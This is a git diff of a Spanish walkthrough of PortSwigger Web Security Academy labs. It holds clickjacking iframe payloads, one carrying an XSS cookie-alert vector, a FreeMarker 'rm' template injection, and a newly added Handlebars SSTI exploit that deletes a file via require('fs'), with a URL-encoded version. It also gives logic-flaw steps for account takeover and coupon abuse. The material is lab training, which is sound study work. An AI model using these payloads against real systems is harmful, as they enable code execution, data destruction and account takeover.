@@ -436,22 +436,24 @@ Para resolver este laboratorio, después de autenticarse con las credenciales pr
 
 ```html
 <style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.0001;
-        z-index: 2;
-    }
-    div {
-        position: absolute;
-        top:560px;
-        left: 60px;
-        z-index: 1;
-    }
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 560px;
+    left: 60px;
+    z-index: 1;
+  }
 </style>
 <div>Click me</div>
-<iframe src="https://ac681f121f04aa6b80980439004b0021.web-security-academy.net/email?email=alguien@algo.com"></iframe>
+<iframe
+  src="https://ac681f121f04aa6b80980439004b0021.web-security-academy.net/email?email=alguien@algo.com"
+></iframe>
 ```
 
 ### [Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)
@@ -462,22 +464,25 @@ La solución a este laboratorio es la misma que el anterior, pero agregando el a
 
 ```html
 <style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.0001;
-        z-index: 2;
-    }
-    div {
-        position: absolute;
-        top:510px;
-        left: 80px;
-        z-index: 1;
-    }
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 510px;
+    left: 80px;
+    z-index: 1;
+  }
 </style>
 <div>Click me</div>
-<iframe sandbox="allow-forms" src="https://ac791f371e807c5c8070fc3c01b80050.web-security-academy.net/email?email=alguien@algo.com"></iframe>
+<iframe
+  sandbox="allow-forms"
+  src="https://ac791f371e807c5c8070fc3c01b80050.web-security-academy.net/email?email=alguien@algo.com"
+></iframe>
 ```
 
 ### [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)
@@ -488,22 +493,24 @@ Al ir a la sección Submit Feedback y enviar un formulario, vemos que se imprime
 
 ```html
 <style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.0001;
-        z-index: 2;
-    }
-    div {
-        position: absolute;
-        top:620px;
-        left: 80px;
-        z-index: 1;
-    }
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 620px;
+    left: 80px;
+    z-index: 1;
+  }
 </style>
 <div>Click me</div>
-<iframe src="https://acc01f561e12d7bb8043912700a00045.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=alguien@algo.com&subject=alguno&message=hello#feedbackResult"></iframe>
+<iframe
+  src="https://acc01f561e12d7bb8043912700a00045.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=alguien@algo.com&subject=alguno&message=hello#feedbackResult"
+></iframe>
 ```
 
 ### [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)
@@ -514,22 +521,23 @@ Para resolver este laboratorio, vamos a la sección Account Actions, copiamos la
 
 ```html
 <style>
-    iframe {
-        position: relative;
-        width: 500px;
-        height: 700px;
-        opacity: 0.0001;
-        z-index: 2;
-    }
-    .first, .next {
-        position: absolute;
-        top: 330px;
-        left: 50px;
-        z-index: 1;
-    }
-    .next {
-        left: 200px;
-    }
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  .first,
+  .next {
+    position: absolute;
+    top: 330px;
+    left: 50px;
+    z-index: 1;
+  }
+  .next {
+    left: 200px;
+  }
 </style>
 <div class="first">Click me first</div>
 <div class="next">Click me next</div>
@@ -1111,6 +1119,40 @@ Al editar un post vemos que se evalúan ciertas expresiones como ${product.price
 
 En la edición de un post insertar lo siguiente <#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("rm /home/carlos/morale.txt") } y guardar.
 
+### [Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+
+#### Descripción:
+
+Al ver un producto sin stock se muestra el mensaje de error correspondiente. Podemos insertar ?message={{7*7}} en la url para obtener un error y determinar que se trata de Handlebars de NodeJS. Realizando una búsqueda podemos encontrarnos con [este exploit](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs) y utilizar el mismo modificándolo para eliminar el archivo deseado:
+
+```
+wrtz{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('fs').unlinkSync('/home/carlos/morale.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+Luego basta con encodear el mismo y enviarlo como valor del parámetro message.
+
+#### Solución:
+
+Ir a LABID.web-security-academy.net/?message=wrtz{{%23with "s" as |string|}}%0A%20 {{%23with "e"}}%0A%20%20%20 {{%23with split as |conslist|}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{this.push (lookup string.sub "constructor")}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{%23with string.split as |codelist|}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{this.push "return require('fs').unlinkSync('%2Fhome%2Fcarlos%2Fmorale.txt')%3B"}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{%23each conslist}}%0A%20%20%20%20%20%20%20%20%20 {{%23with (string.sub.apply 0 codelist)}}%0A%20%20%20%20%20%20%20%20%20%20%20 {{this}}%0A%20%20%20%20%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20%20%20%20%20 {{%2Feach}}%0A%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20 {{%2Fwith}}%0A%20 {{%2Fwith}}%0A{{%2Fwith}}
+
 ---
 
 ## [Directory traversal](https://portswigger.net/web-security/file-path-traversal)
@@ -1641,15 +1683,15 @@ Para resolver este laboratorio se debe:
 1. Iniciar sesión en el sitio vulnerable, ir a "My account", activar Intercept y cambiar la contraseña.
 2. En la request interceptada, eliminar el parámetro `current-password`.
 3. En la misma request, cambiar el valor del parámetro `username` por `administrator`.
-4. *Forwardear* la request.
+4. _Forwardear_ la request.
 5. Cerrar sesión e iniciar sesión como administrator con la contraseña cambiada.
 6. Ir al panel de administración y eliminar al usuario carlos.
 
 ### [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)
 
-1. Con Intercept activado, iniciar sesión y comprar cualquier producto que esté dentro del crédito disponible (por ejemplo, un *Beat the Vacation Traffic*).
+1. Con Intercept activado, iniciar sesión y comprar cualquier producto que esté dentro del crédito disponible (por ejemplo, un _Beat the Vacation Traffic_).
 2. La última request interceptada, cuando se compra algo (la de `POST /cart/checkout`), redirige a una página que confirma que la compra fue exitosa. Esa request hay que enviar a Repeater.
-3. Agregar un *Lightweight l33t leather jacket* al carrito.
+3. Agregar un _Lightweight l33t leather jacket_ al carrito.
 4. Con Repeater volver a enviar la request de confirmación de compra. La compra se completa y no se descuenta saldo.
 
 ### [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
@@ -1661,8 +1703,8 @@ No pudimos resolver el laboratorio porque se requiere usar las Engagement tools 
 Para resolver este laboratorio se debe:
 
 1. Iniciar sesión en el sitio vulnerable. Los nuevos usuarios pueden usar el cupón de descuento `NEWCUST5`.
-2. Al final de la página, suscribirse al *newsletter*. Entonces se puede usar otro código más, `SIGNUP30`.
-3. Agregar un *Lightweight l33t leather jacket* al carrito.
+2. Al final de la página, suscribirse al _newsletter_. Entonces se puede usar otro código más, `SIGNUP30`.
+3. Agregar un _Lightweight l33t leather jacket_ al carrito.
 4. Ir al checkout y aplicar ambos cupones.
 5. Si se intenta aplicar dos veces seguidas un mismo cupón, sale un error. Sin embargo, si se van alternando los cupones, no da ningún error.
 6. Reutilizar ambos cupones hasta que el total de la compra sea menor al saldo disponible y comprar el producto.
